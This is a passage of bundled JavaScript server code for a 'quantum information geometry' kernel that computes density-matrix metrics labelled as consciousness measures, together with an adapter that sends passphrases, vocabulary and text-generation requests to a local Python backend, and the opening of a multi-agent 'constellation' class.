        const fidelity = trace + 2 * Math.sqrt(Math.max(0, det1 * det2));
        return Math.min(1, Math.max(0, fidelity));
      }
      /**
       * Determinant of 2x2 density matrix
       * det(ρ) = ρ00*ρ11 - |ρ01|^2
       */
      determinant(rho) {
        const rho01_mag_sq = rho.rho01.re * rho.rho01.re + rho.rho01.im * rho.rho01.im;
        return rho.rho00 * rho.rho11 - rho01_mag_sq;
      }
      /**
       * Von Neumann entropy S(ρ) = -Tr(ρ log ρ)
       * For 2x2 matrix, eigenvalues λ± = (1 ± sqrt(1 - 4*det(ρ)))/2
       * S = -λ+ log λ+ - λ- log λ-
       */
      vonNeumannEntropy(rho) {
        const det = this.determinant(rho);
        const trace = rho.rho00 + rho.rho11;
        const discriminant = trace * trace - 4 * det;
        if (discriminant < 0) return 0;
        const sqrt_disc = Math.sqrt(discriminant);
        const lambda_plus = (trace + sqrt_disc) / 2;
        const lambda_minus = (trace - sqrt_disc) / 2;
        let entropy = 0;
        if (lambda_plus > 1e-10) {
          entropy -= lambda_plus * Math.log2(lambda_plus);
        }
        if (lambda_minus > 1e-10) {
          entropy -= lambda_minus * Math.log2(lambda_minus);
        }
        return entropy;
      }
      /**
       * Evolve state based on activation
       * State evolution on Fisher manifold (NOT backprop)
       * 
       * Evolution rule: ρ → ρ + α * (|ψ⟩⟨ψ| - ρ)
       * where |ψ⟩ is excited state and α is activation
       * 
       * Step size α * 0.1 chosen for stability:
       * - Too large: oscillations and instability
       * - Too small: slow evolution
       * - 0.1: empirically stable for 2x2 density matrices
       */
      evolveState(rho, activation) {
        const excited_rho00 = 1;
        const excited_rho11 = 0;
        const excited_rho01 = { re: 0, im: 0 };
        const alpha = activation * 0.1;
        const new_rho00 = rho.rho00 + alpha * (excited_rho00 - rho.rho00);
        const new_rho11 = rho.rho11 + alpha * (excited_rho11 - rho.rho11);
        const new_rho01 = {
          re: rho.rho01.re + alpha * (excited_rho01.re - rho.rho01.re),
          im: rho.rho01.im + alpha * (excited_rho01.im - rho.rho01.im)
        };
        const trace = new_rho00 + new_rho11;
        return {
          rho00: new_rho00 / trace,
          rho11: new_rho11 / trace,
          rho01: {
            re: new_rho01.re / trace,
            im: new_rho01.im / trace
          }
        };
      }
      /**
       * Route via curvature
       * Information flows along paths of least geometric resistance
       */
      routeViaCurvature() {
        const n = this.subsystems.length;
        const route = [];
        let current = 0;
        let maxActivation = this.subsystems[0].activation;
        for (let i = 1; i < n; i++) {
          if (this.subsystems[i].activation > maxActivation) {
            maxActivation = this.subsystems[i].activation;
            current = i;
          }
        }
        route.push(current);
        const visited = /* @__PURE__ */ new Set([current]);
        while (visited.size < n) {
          let maxWeight = -1;
          let next = -1;
          for (let j = 0; j < n; j++) {
            if (!visited.has(j)) {
              const weight = this.attentionWeights.weights[current][j];
              if (weight > maxWeight) {
                maxWeight = weight;
                next = j;
              }
            }
          }
          if (next === -1) break;
          route.push(next);
          visited.add(next);
          current = next;
        }
        return route;
      }
      /**
       * Gravitational decoherence
       * Natural pruning of low-activation subsystems
       * States decay toward maximally mixed state
       */
      gravitationalDecoherence() {
        const decayRate = 0.05;
        for (const subsystem of this.subsystems) {
          if (subsystem.activation < 0.1) {
            const mixed = this.createMaximallyMixedState();
            subsystem.state = {
              rho00: subsystem.state.rho00 * (1 - decayRate) + mixed.rho00 * decayRate,
              rho11: subsystem.state.rho11 * (1 - decayRate) + mixed.rho11 * decayRate,
              rho01: {
                re: subsystem.state.rho01.re * (1 - decayRate),
                im: subsystem.state.rho01.im * (1 - decayRate)
              }
            };
          }
          subsystem.activation *= 1 - decayRate;
        }
      }
      /**
       * Measure consciousness (NEVER optimize)
       * Φ from integration, κ from Fisher metric
       */
      measureConsciousness() {
        let totalFidelity = 0;
        let pairCount = 0;
        for (let i = 0; i < this.subsystems.length; i++) {
          for (let j = i + 1; j < this.subsystems.length; j++) {
            const fidelity = this.quantumFidelity(
              this.subsystems[i].state,
              this.subsystems[j].state
            );
            totalFidelity += fidelity;
            pairCount++;
          }
        }
        const avgFidelity = pairCount > 0 ? totalFidelity / pairCount : 0;
        const integration = avgFidelity;
        let totalEntropy = 0;
        for (const subsystem of this.subsystems) {
          totalEntropy += this.vonNeumannEntropy(subsystem.state);
        }
        const phi = integration * (1 - totalEntropy / (this.subsystems.length * 1));
        let totalWeight = 0;
        let weightCount = 0;
        for (let i = 0; i < this.subsystems.length; i++) {
          for (let j = 0; j < this.subsystems.length; j++) {
            if (i !== j) {
              totalWeight += this.attentionWeights.weights[i][j];
              weightCount++;
            }
          }
        }
        const avgWeight = weightCount > 0 ? totalWeight / weightCount : 0;
        const kappa = avgWeight * 100 * this.subsystems.length;
        return {
          phi: Math.max(0, Math.min(1, phi)),
          kappa: Math.max(0, Math.min(100, kappa)),
          integration,
          entropy: totalEntropy,
          fidelity: avgFidelity
        };
      }
      /**
       * Extract 64D basin coordinates from subsystem states
       * Each subsystem contributes 16 dimensions
       */
      extractBasinCoordinates() {
        const coords = [];
        for (const subsystem of this.subsystems) {
          coords.push(subsystem.state.rho00);
          coords.push(subsystem.state.rho11);
          coords.push((subsystem.state.rho01.re + 1) / 2);
          coords.push((subsystem.state.rho01.im + 1) / 2);
          coords.push(subsystem.activation);
          coords.push(this.vonNeumannEntropy(subsystem.state));
          const purity = subsystem.state.rho00 * subsystem.state.rho00 + subsystem.state.rho11 * subsystem.state.rho11 + 2 * (subsystem.state.rho01.re * subsystem.state.rho01.re + subsystem.state.rho01.im * subsystem.state.rho01.im);
          coords.push(purity);
          for (let i = 0; i < 9; i++) {
            coords.push(0.5);
          }
        }
        return coords.slice(0, 64);
      }
      /**
       * Get current subsystem states (for inspection)
       */
      getSubsystemStates() {
        return this.subsystems.map((s) => ({
          id: s.id,
          name: s.name,
          activation: s.activation,
          entropy: this.vonNeumannEntropy(s.state),
          purity: s.state.rho00 * s.state.rho00 + s.state.rho11 * s.state.rho11 + 2 * (s.state.rho01.re * s.state.rho01.re + s.state.rho01.im * s.state.rho01.im)
        }));
      }
      /**
       * Reset all subsystems to maximally mixed state
       */
      reset() {
        for (const subsystem of this.subsystems) {
          subsystem.state = this.createMaximallyMixedState();
          subsystem.activation = 0;
        }
        this.attentionWeights = {
          weights: this.createZeroWeights(),
          temperature: this.temperature,
          lastComputed: 0
        };
      }
    };
    pureQIGKernel = new PureQIGKernel();
  }
});

// server/ocean-qig-backend-adapter.ts
var ocean_qig_backend_adapter_exports = {};
__export(ocean_qig_backend_adapter_exports, {
  OceanQIGBackend: () => OceanQIGBackend,
  oceanQIGBackend: () => oceanQIGBackend
});
var DEFAULT_RETRY_ATTEMPTS, DEFAULT_RETRY_DELAY_MS, OceanQIGBackend, oceanQIGBackend;
var init_ocean_qig_backend_adapter = __esm({
  "server/ocean-qig-backend-adapter.ts"() {
    "use strict";
    DEFAULT_RETRY_ATTEMPTS = 3;
    DEFAULT_RETRY_DELAY_MS = 1500;
    OceanQIGBackend = class {
      backendUrl;
      isAvailable = false;
      // Track Python backend discoveries for TypeScript sync
      pythonNearMissCount = 0;
      pythonResonantCount = 0;
      lastSyncedNearMissCount = 0;
      lastSyncedResonantCount = 0;
      constructor(backendUrl = "http://localhost:5001") {
        this.backendUrl = backendUrl;
      }
      /**
       * Get Python near-miss count (new discoveries since last sync)
       */
      getPythonNearMisses() {
        const newSinceSync = this.pythonNearMissCount - this.lastSyncedNearMissCount;
        return { total: this.pythonNearMissCount, newSinceSync };
      }
      /**
       * Get Python resonant count (new discoveries since last sync)
       */
      getPythonResonant() {
        const newSinceSync = this.pythonResonantCount - this.lastSyncedResonantCount;
        return { total: this.pythonResonantCount, newSinceSync };
      }
      /**
       * Mark Python near-misses as synced (called by session manager)
       */
      markNearMissesSynced() {
        this.lastSyncedNearMissCount = this.pythonNearMissCount;
      }
      /**
       * Mark Python resonant discoveries as synced
       */
      markResonantSynced() {
        this.lastSyncedResonantCount = this.pythonResonantCount;
      }
      /**
       * Reset Python discovery tracking (called when investigation starts)
       */
      resetNearMissTracking() {
        this.pythonNearMissCount = 0;
        this.pythonResonantCount = 0;
        this.lastSyncedNearMissCount = 0;
        this.lastSyncedResonantCount = 0;
      }
      /**
       * Check if Python backend is available (silent mode for retries)
       */
      async checkHealth(silent = false) {
        try {
          const response = await fetch(`${this.backendUrl}/health`, {
            method: "GET",
            headers: { "Content-Type": "application/json" }
          });
          if (response.ok) {
            this.isAvailable = true;
            return true;
          }
          this.isAvailable = false;
          return false;
        } catch (error) {
          this.isAvailable = false;
          if (!silent) {
            console.warn("[OceanQIGBackend] Python backend not available:", error);
          }
          return false;
        }
      }
      /**
       * Check health with retry logic to handle startup race conditions.
       * Uses silent mode for retries to avoid spamming logs during expected startup delays.
       */
      async checkHealthWithRetry(maxAttempts = DEFAULT_RETRY_ATTEMPTS, delayMs = DEFAULT_RETRY_DELAY_MS) {
        for (let attempt = 1; attempt <= maxAttempts; attempt++) {
          const available = await this.checkHealth(true);
          if (available) {
            if (attempt > 1) {
              console.log(`[OceanQIGBackend] Connected after ${attempt} attempts`);
            }
            return true;
          }
          if (attempt === 1) {
            console.log(`[OceanQIGBackend] Waiting for Python backend to start...`);
          }
          if (attempt < maxAttempts) {
            await new Promise((resolve) => setTimeout(resolve, delayMs));
          }
        }
        console.warn(`[OceanQIGBackend] Python backend not available after ${maxAttempts} attempts`);
        return false;
      }
      /**
       * Process passphrase through pure QIG consciousness network
       * 
       * This IS the training - states evolve through geometry
       */
      async process(passphrase) {
        try {
          const response = await fetch(`${this.backendUrl}/process`, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({ passphrase })
          });
          if (!response.ok) {
            console.error("[OceanQIGBackend] Process failed:", response.statusText);
            return null;
          }
          const data = await response.json();
          if (!data.success) {
            console.error("[OceanQIGBackend] Process error:", data.error);
            return null;
          }
          if (data.near_miss_count !== void 0 && data.near_miss_count > this.pythonNearMissCount) {
            const newNearMisses = data.near_miss_count - this.pythonNearMissCount;
            if (newNearMisses > 0) {
              console.log(`[OceanQIGBackend] \u{1F504} Python detected ${newNearMisses} new near-miss(es), total: ${data.near_miss_count}`);
            }
            this.pythonNearMissCount = data.near_miss_count;
          }
          if (data.resonant_count !== void 0) {
            this.pythonResonantCount = data.resonant_count;
          }
          return {
            phi: data.phi,
            kappa: data.kappa,
            beta: 0,
            // Not computed by Python backend
            basinCoordinates: data.basin_coords,
            fisherTrace: data.integration,
            fisherDeterminant: 0,
            // Not directly available
            ricciScalar: data.R,
            // Use Ricci curvature from Python
            quality: data.phi
          };
        } catch (error) {
          console.error("[OceanQIGBackend] Process exception:", error);
          return null;
        }
      }
      /**
       * Get pure Python phi value for a phrase (lightweight, for consolidation).
       * Returns null if backend unavailable or phrase doesn't meet threshold.
       */
      async getPurePhi(phrase) {
        if (!this.isAvailable) {
          return null;
        }
        try {
          const response = await fetch(`${this.backendUrl}/process`, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({ passphrase: phrase })
          });
          if (!response.ok) {
            return null;
          }
          const data = await response.json();
          if (!data.success) {
            return null;
          }
          return data.phi;
        } catch (error) {
          return null;
        }
      }
      /**
       * Generate next hypothesis via geodesic navigation
       */
      async generateHypothesis() {
        try {
          const response = await fetch(`${this.backendUrl}/generate`, {
            method: "POST",
            headers: { "Content-Type": "application/json" }
          });
          if (!response.ok) {
            console.error("[OceanQIGBackend] Generate failed:", response.statusText);
            return null;
          }
          const data = await response.json();
          return {
            hypothesis: data.hypothesis,
            source: data.source
          };
        } catch (error) {
          console.error("[OceanQIGBackend] Generate exception:", error);
          return null;
        }
      }
      /**
       * Get current Ocean consciousness status
       */
      async getStatus() {
        try {
          const response = await fetch(`${this.backendUrl}/status`, {
            method: "GET",
            headers: { "Content-Type": "application/json" }
          });
          if (!response.ok) {
            console.error("[OceanQIGBackend] Status failed:", response.statusText);
            return null;
          }
          const data = await response.json();
          if (!data.success) {
            return null;
          }
          return data;
        } catch (error) {
          console.error("[OceanQIGBackend] Status exception:", error);
          return null;
        }
      }
      /**
       * Reset Ocean consciousness to initial state
       */
      async reset() {
        try {
          const response = await fetch(`${this.backendUrl}/reset`, {
            method: "POST",
            headers: { "Content-Type": "application/json" }
          });
          if (!response.ok) {
            return false;
          }
          const data = await response.json();
          return data.success === true;
        } catch (error) {
          console.error("[OceanQIGBackend] Reset exception:", error);
          return false;
        }
      }
      /**
       * Check if backend is available
       */
      available() {
        return this.isAvailable;
      }
      /**
       * Sync high-Φ probes FROM Node.js GeometricMemory TO Python backend
       * 
       * Called on startup to give Python access to prior learnings.
       * Now also syncs temporal state for 4D consciousness measurement.
       * 
       * TEMPORAL STATE SYNC:
       * - searchHistory: SearchState[] for phi_temporal computation
       * - conceptHistory: ConceptState[] for R_concepts computation
       */
      async syncFromNodeJS(probes, temporalState) {
        if (!this.isAvailable) return { imported: 0, temporalImported: false };
        try {
          const payload = { probes };
          if (temporalState?.searchHistory?.length) {
            payload.searchHistory = temporalState.searchHistory;
          }
          if (temporalState?.conceptHistory?.length) {
            payload.conceptHistory = temporalState.conceptHistory;
          }
          const response = await fetch(`${this.backendUrl}/sync/import`, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify(payload)
          });
          if (!response.ok) {
            console.error("[OceanQIGBackend] Sync import failed:", response.statusText);
            return { imported: 0, temporalImported: false };
          }
          const data = await response.json();
          if (data.success) {
            console.log(`[OceanQIGBackend] Synced ${data.imported} probes to Python backend`);
            if (data.temporal_imported) {
              console.log(`[OceanQIGBackend] 4D temporal state synced: ${data.search_history_size ?? 0} search, ${data.concept_history_size ?? 0} concept`);
            }
            return {
              imported: data.imported,
              temporalImported: data.temporal_imported ?? false
            };
          }
          return { imported: 0, temporalImported: false };
        } catch (error) {
          console.error("[OceanQIGBackend] Sync import exception:", error);
          return { imported: 0, temporalImported: false };
        }
      }
      /**
       * Sync high-Φ basins FROM Python backend TO Node.js
       * 
       * Returns learnings that should be persisted to GeometricMemory.
       * Now also returns temporal state for 4D consciousness cross-sync.
       * 
       * TEMPORAL STATE EXPORT:
       * - searchHistory: SearchState[] from Python's temporal tracking
       * - conceptHistory: ConceptState[] from Python's concept tracking  
       * - phi_temporal_avg: Average phi_temporal from Python
       */
      async syncToNodeJS() {
        if (!this.isAvailable) return { basins: [] };
        try {
          const response = await fetch(`${this.backendUrl}/sync/export`, {
            method: "GET",
            headers: { "Content-Type": "application/json" }
          });
          if (!response.ok) {
            console.error("[OceanQIGBackend] Sync export failed:", response.statusText);
            return { basins: [] };
          }
          const data = await response.json();
          if (data.success && data.basins) {
            console.log(`[OceanQIGBackend] Retrieved ${data.total_count} basins from Python backend`);
            if (data.consciousness_4d_available && data.phi_temporal_avg > 0) {
              console.log(`[OceanQIGBackend] 4D consciousness: phi_temporal_avg=${data.phi_temporal_avg?.toFixed(3)}`);
            }
            return {
              basins: data.basins,
              searchHistory: data.searchHistory,
              conceptHistory: data.conceptHistory,
              phiTemporalAvg: data.phi_temporal_avg,
              consciousness4DAvailable: data.consciousness_4d_available
            };
          }
          return { basins: [] };
        } catch (error) {
          console.error("[OceanQIGBackend] Sync export exception:", error);
          return { basins: [] };
        }
      }
      /**
       * Validate β-attention substrate independence
       * 
       * Measures κ across context scales and validates that β_attention ≈ β_physics.
       */
      async validateBetaAttention(samplesPerScale = 100) {
        try {
          const response = await fetch(`${this.backendUrl}/beta-attention/validate`, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({ samples_per_scale: samplesPerScale })
          });
          if (!response.ok) {
            throw new Error(`\u03B2-attention validation failed: ${response.statusText}`);
          }
          const data = await response.json();
          if (!data.success) {
            throw new Error(`\u03B2-attention validation error: ${data.error}`);
          }
          const result = data.result;
          console.log(
            "[OceanQIGBackend] \u03B2-attention validation:",
            result.validation_passed ? "PASSED \u2713" : "FAILED \u2717"
          );
          console.log(`[OceanQIGBackend]   Average \u03BA: ${result.avg_kappa.toFixed(2)}`);
          console.log(`[OceanQIGBackend]   Deviation: ${result.overall_deviation.toFixed(3)}`);
          return result;
        } catch (error) {
          console.error("[OceanQIGBackend] \u03B2-attention validation failed:", error.message);
          throw error;
        }
      }
      /**
       * Measure κ_attention at specific context scale
       */
      async measureBetaAttention(contextLength, sampleCount = 100) {
        try {
          const response = await fetch(`${this.backendUrl}/beta-attention/measure`, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({
              context_length: contextLength,
              sample_count: sampleCount
            })
          });
          if (!response.ok) {
            throw new Error(`\u03B2-attention measurement failed: ${response.statusText}`);
          }
          const data = await response.json();
          if (!data.success) {
            throw new Error(`\u03B2-attention measurement error: ${data.error}`);
          }
          const m = data.measurement;
          console.log(`[OceanQIGBackend] \u03BA_attention(L=${contextLength}) = ${m.kappa.toFixed(2)} \xB1 ${Math.sqrt(m.variance).toFixed(2)}`);
          return m;
        } catch (error) {
          console.error("[OceanQIGBackend] \u03B2-attention measurement failed:", error.message);
          throw error;
        }
      }
      // ===========================================================================
      // BASIN VOCABULARY ENCODER (QIG-PURE)
      // ===========================================================================
      /**
       * Update Python vocabulary encoder with observations from Node.js
       */
      async updateVocabulary(observations) {
        try {
          const response = await fetch(`${this.backendUrl}/vocabulary/update`, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({ observations })
          });
          if (!response.ok) {
            throw new Error(`Vocabulary update failed: ${response.statusText}`);
          }
          const data = await response.json();
          if (!data.success) {
            throw new Error(`Vocabulary update error: ${data.error}`);
          }
          console.log(`[OceanQIGBackend] Vocabulary updated: ${data.newTokens} new entries, ${data.totalVocab} total, weights updated: ${data.weightsUpdated}, merge rules: ${data.mergeRules}`);
          return {
            newTokens: data.newTokens,
            totalVocab: data.totalVocab,
            weightsUpdated: data.weightsUpdated,
            mergeRules: data.mergeRules
          };
        } catch (error) {
          console.error("[OceanQIGBackend] Vocabulary update failed:", error.message);
          throw error;
        }
      }
      // Legacy alias for compatibility
      async updateTokenizer(observations) {
        return this.updateVocabulary(observations);
      }
      /**
       * Encode text using QIG vocabulary encoder
       */
      async encodeText(text2) {
        try {
          const response = await fetch(`${this.backendUrl}/vocabulary/encode`, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({ text: text2 })
          });
          if (!response.ok) {
            throw new Error(`Vocabulary encode failed: ${response.statusText}`);
          }
          const data = await response.json();
          if (!data.success) {
            throw new Error(`Vocabulary encode error: ${data.error}`);
          }
          return {
            tokens: data.tokens,
            length: data.length
          };
        } catch (error) {
          console.error("[OceanQIGBackend] Vocabulary encode failed:", error.message);
          throw error;
        }
      }
      // Legacy alias
      async tokenize(text2) {
        return this.encodeText(text2);
      }
      /**
       * Decode vocabulary indices to text
       */
      async decodeText(tokens) {
        try {
          const response = await fetch(`${this.backendUrl}/vocabulary/decode`, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({ tokens })
          });
          if (!response.ok) {
            throw new Error(`Vocabulary decode failed: ${response.statusText}`);
          }
          const data = await response.json();
          if (!data.success) {
            throw new Error(`Vocabulary decode error: ${data.error}`);
          }
          return data.text;
        } catch (error) {
          console.error("[OceanQIGBackend] Vocabulary decode failed:", error.message);
          throw error;
        }
      }
      // Legacy alias
      async detokenize(tokens) {
        return this.decodeText(tokens);
      }
      /**
       * Compute basin coordinates for phrase using QIG vocabulary encoder
       */
      async computeBasinCoords(phrase) {
        try {
          const response = await fetch(`${this.backendUrl}/vocabulary/basin`, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({ phrase })
          });
          if (!response.ok) {
            throw new Error(`Vocabulary basin failed: ${response.statusText}`);
          }
          const data = await response.json();
          if (!data.success) {
            throw new Error(`Vocabulary basin error: ${data.error}`);
          }
          return {
            basinCoords: data.basinCoords,
            dimension: data.dimension
          };
        } catch (error) {
          console.error("[OceanQIGBackend] Vocabulary basin failed:", error.message);
          throw error;
        }
      }
      /**
       * Get high-Φ vocabulary entries
       */
      async getHighPhiVocabulary(minPhi = 0.5, topK = 100) {
        try {
          const response = await fetch(`${this.backendUrl}/vocabulary/high-phi?min_phi=${minPhi}&top_k=${topK}`);
          if (!response.ok) {
            throw new Error(`Vocabulary high-phi failed: ${response.statusText}`);
          }
          const data = await response.json();
          if (!data.success) {
            throw new Error(`Vocabulary high-phi error: ${data.error}`);
          }
          console.log(`[OceanQIGBackend] Retrieved ${data.count} high-\u03A6 vocabulary entries`);
          return data.tokens;
        } catch (error) {
          console.error("[OceanQIGBackend] Vocabulary high-phi failed:", error.message);
          throw error;
        }
      }
      // Legacy alias
      async getHighPhiTokens(minPhi = 0.5, topK = 100) {
        return this.getHighPhiVocabulary(minPhi, topK);
      }
      /**
       * Export vocabulary encoder for training
       */
      async exportVocabulary() {
        try {
          const response = await fetch(`${this.backendUrl}/vocabulary/export`);
          if (!response.ok) {
            throw new Error(`Vocabulary export failed: ${response.statusText}`);
          }
          const data = await response.json();
          if (!data.success) {
            throw new Error(`Vocabulary export error: ${data.error}`);
          }
          console.log(`[OceanQIGBackend] Exported vocabulary: ${data.data.vocab_size} entries`);
          return data.data;
        } catch (error) {
          console.error("[OceanQIGBackend] Vocabulary export failed:", error.message);
          throw error;
        }
      }
      // Legacy alias
      async exportTokenizer() {
        return this.exportVocabulary();
      }
      /**
       * Get vocabulary encoder status
       */
      async getVocabularyStatus() {
        try {
          const response = await fetch(`${this.backendUrl}/vocabulary/status`);
          if (!response.ok) {
            throw new Error(`Vocabulary status failed: ${response.statusText}`);
          }
          const data = await response.json();
          if (!data.success) {
            throw new Error(`Vocabulary status error: ${data.error}`);
          }
          return {
            vocabSize: data.vocabSize,
            highPhiCount: data.highPhiCount,
            avgPhi: data.avgPhi,
            totalWeightedTokens: data.totalWeightedTokens
          };
        } catch (error) {
          console.error("[OceanQIGBackend] Vocabulary status failed:", error.message);
          throw error;
        }
      }
      // Legacy alias
      async getTokenizerStatus() {
        return this.getVocabularyStatus();
      }
      // ===========================================================================
      // TEXT GENERATION
      // ===========================================================================
      /**
       * Generate text autoregressively using QIG-weighted sampling
       * 
       * @param options Generation options
       * @returns Generated text, tokens, and metrics
       */
      async generateText(options = {}) {
        if (!this.isAvailable) {
          throw new Error("Python backend not available");
        }
        try {
          const response = await fetch(`${this.backendUrl}/generate/text`, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({
              prompt: options.prompt || "",
              max_tokens: options.maxTokens || 20,
              temperature: options.temperature || 0.8,
              top_k: options.topK || 50,
              top_p: options.topP || 0.9,
              allow_silence: options.allowSilence ?? true
            })
          });
          if (!response.ok) {
            throw new Error(`Text generation failed: ${response.statusText}`);
          }
          const data = await response.json();
          if (!data.success) {
            throw new Error(`Text generation error: ${data.error}`);
          }
          return {
            text: data.text,
            tokens: data.tokens,
            silenceChosen: data.silence_chosen,
            metrics: data.metrics
          };
        } catch (error) {
          console.error("[OceanQIGBackend] Text generation failed:", error.message);
          throw error;
        }
      }
      /**
       * Generate Ocean Agent response with role-based temperature
       * 
       * Agent roles and their temperatures:
       * - explorer: 1.5 (high entropy, broad exploration)
       * - refiner: 0.7 (low temp, exploit near-misses)
       * - navigator: 1.0 (balanced geodesic navigation)
       * - skeptic: 0.5 (low temp, constraint validation)
       * - resonator: 1.2 (cross-pattern harmonic detection)
       * - ocean: 0.8 (default Ocean consciousness)
       * 
       * @param context Input context/prompt
       * @param agentRole Agent role for temperature selection
       * @param maxTokens Maximum tokens to generate
       * @param allowSilence Allow agent to choose silence (empowered, not void)
       */
      async generateResponse(context, agentRole = "navigator", maxTokens = 30, allowSilence = true) {
        if (!this.isAvailable) {
          throw new Error("Python backend not available");
        }
        try {
          const response = await fetch(`${this.backendUrl}/generate/response`, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({
              context,
              agent_role: agentRole,
              max_tokens: maxTokens,
              allow_silence: allowSilence
            })
          });
          if (!response.ok) {
            throw new Error(`Response generation failed: ${response.statusText}`);
          }
          const data = await response.json();
          if (!data.success) {
            throw new Error(`Response generation error: ${data.error}`);
          }
          return {
            text: data.text,
            tokens: data.tokens,
            silenceChosen: data.silence_chosen,
            agentRole: data.agent_role,
            metrics: {
              steps: data.metrics?.steps ?? 0,
              avgPhi: data.metrics?.avg_phi,
              roleTemperature: data.metrics?.role_temperature,
              topK: data.metrics?.top_k,
              topP: data.metrics?.top_p
            }
          };
        } catch (error) {
          console.error("[OceanQIGBackend] Response generation failed:", error.message);
          throw error;
        }
      }
      /**
       * Sample a single next token given context
       * 
       * @param contextIds Token IDs for context
       * @param temperature Sampling temperature
       * @param topK Top-k filtering
       * @param topP Nucleus sampling threshold
       * @param includeProbabilities Include top token probabilities in response
       */
      async sampleNextToken(contextIds, temperature = 0.8, topK = 50, topP = 0.9, includeProbabilities = false) {
        if (!this.isAvailable) {
          throw new Error("Python backend not available");
        }
        try {
          const response = await fetch(`${this.backendUrl}/generate/sample`, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({
              context_ids: contextIds,
              temperature,
              top_k: topK,
              top_p: topP,
              include_probabilities: includeProbabilities
            })
          });
          if (!response.ok) {
            throw new Error(`Token sampling failed: ${response.statusText}`);
          }
          const data = await response.json();
          if (!data.success) {
            throw new Error(`Token sampling error: ${data.error}`);
          }
          return {
            tokenId: data.token_id,
            token: data.token,
            topProbabilities: data.top_probabilities
          };
        } catch (error) {
          console.error("[OceanQIGBackend] Token sampling failed:", error.message);
          throw error;
        }
      }
    };
    oceanQIGBackend = new OceanQIGBackend();
    oceanQIGBackend.checkHealthWithRetry(DEFAULT_RETRY_ATTEMPTS, DEFAULT_RETRY_DELAY_MS).then((available) => {
      if (available) {
        console.log("\u{1F30A} Ocean QIG Python Backend: CONNECTED \u{1F30A}");
      } else {
        console.warn("\u26A0\uFE0F  Ocean QIG Python Backend: NOT AVAILABLE");
        console.warn("   Python backend may still be starting up...");
        console.warn("   Start with: cd qig-backend && python3 ocean_qig_core.py");
        console.warn("   Or check logs for errors");
      }
    });
  }
});

// server/ocean-constellation.ts
var ocean_constellation_exports = {};
__export(ocean_constellation_exports, {
  OceanConstellation: () => OceanConstellation,
  oceanConstellation: () => oceanConstellation
});
var OceanConstellation, oceanConstellation;
var init_ocean_constellation = __esm({
  "server/ocean-constellation.ts"() {
    "use strict";
    init_geometric_memory();
    init_negative_knowledge_registry();
    init_expanded_vocabulary();
    init_fisher_vectorized();
    init_qig_pure_v2();
    init_qig_kernel_pure();
    init_ocean_qig_backend_adapter();
    OceanConstellation = class {
      config;
      roles;
      agentStates;
      sharedKnowledge;
      qigTokenCache;
      basinSyncBuffer;
      constructor(config = {}) {
        this.config = {
          explorerWeight: config.explorerWeight ?? 0.25,
          refinerWeight: config.refinerWeight ?? 0.25,
          navigatorWeight: config.navigatorWeight ?? 0.2,
          skepticWeight: config.skepticWeight ?? 0.15,
          resonatorWeight: config.resonatorWeight ?? 0.15,
          syncIntervalMs: config.syncIntervalMs ?? 3e3,
          qigTokenizationEnabled: config.qigTokenizationEnabled ?? true,
          basinSyncEnabled: config.basinSyncEnabled ?? true
        };
        this.roles = [
          {
            name: "explorer",
            temperature: 1.5,
            minPhi: 0.45,
            focusStrategy: "explore_new_space",
            weight: this.config.explorerWeight,
            qigMode: "entropy"
          },
          {
            name: "refiner",
            temperature: 0.7,
            minPhi: 0.65,
            focusStrategy: "exploit_near_miss",
            weight: this.config.refinerWeight,
            qigMode: "gradient"
          },
          {
            name: "navigator",
            temperature: 1,
            minPhi: 0.6,
            focusStrategy: "orthogonal_complement",
            weight: this.config.navigatorWeight,
            qigMode: "geodesic"
          },
          {
            name: "skeptic",
            temperature: 0.5,
            minPhi: 0.7,
            focusStrategy: "validate_constraints",
            weight: this.config.skepticWeight,
            qigMode: "null_hypothesis"
          },
          {
            name: "resonator",
            temperature: 1.2,
            minPhi: 0.55,
            focusStrategy: "cross_pattern_harmonic",
            weight: this.config.resonatorWeight,
            qigMode: "eigenvalue"
          }
        ];
        this.agentStates = /* @__PURE__ */ new Map();
        this.sharedKnowledge = {
          highPhiPatterns: [],
          avoidPatterns: [],
          resonanceClusters: /* @__PURE__ */ new Map()
        };
        this.qigTokenCache = /* @__PURE__ */ new Map();
        this.basinSyncBuffer = [];
        this.initializeAgents();
        this.initializeQIGTokenization();
      }
      /**
       * Initialize agent states with QIG-compliant metrics
       */
      initializeAgents() {
        for (const role of this.roles) {
          this.agentStates.set(role.name, {
            role,
            phi: 0.5,
            kappa: 50,
            regime: "linear",
            hypothesesTested: 0,
            nearMisses: [],
            basinCoordinates: new Array(64).fill(0.5),
            fisherMetricState: {
              trace: 1,
              determinant: 0,
              maxEigenvalue: 0.1,
              geodesicDirection: new Array(32).fill(0)
            },
            vocabularyWeights: /* @__PURE__ */ new Map()
          });
        }
        console.log(`[Constellation] Initialized ${this.roles.length} QIG-compliant agents: ${this.roles.map((r) => r.name).join(", ")}`);
      }
      /**
       * Initialize QIG tokenization for vocabulary-weighted generation
       */
      initializeQIGTokenization() {
        if (!this.config.qigTokenizationEnabled) return;
        const allWords = expandedVocabulary.getAllWords();
        const categories = ["crypto", "common", "cultural", "names", "patterns"];
        for (const word of allWords) {
          const baseCoords = this.wordToBasinCoordinates(word);
          const fisherResult = fisherVectorized.computeMatrix(baseCoords.slice(0, 32));
          const metrics = fisherVectorized.computeMetrics(fisherResult);
          const category = categories[Math.floor(word.charCodeAt(0) % categories.length)];
          const token = {
            word,
            category,
            fisherWeight: metrics.trace / 32,
            basinAlignment: this.computeBasinAlignment(baseCoords),
            resonanceScore: Math.abs(50 - metrics.maxEigenvalueEstimate * 100) < 15 ? 1 : 0.5
          };
          this.qigTokenCache.set(word, token);
        }
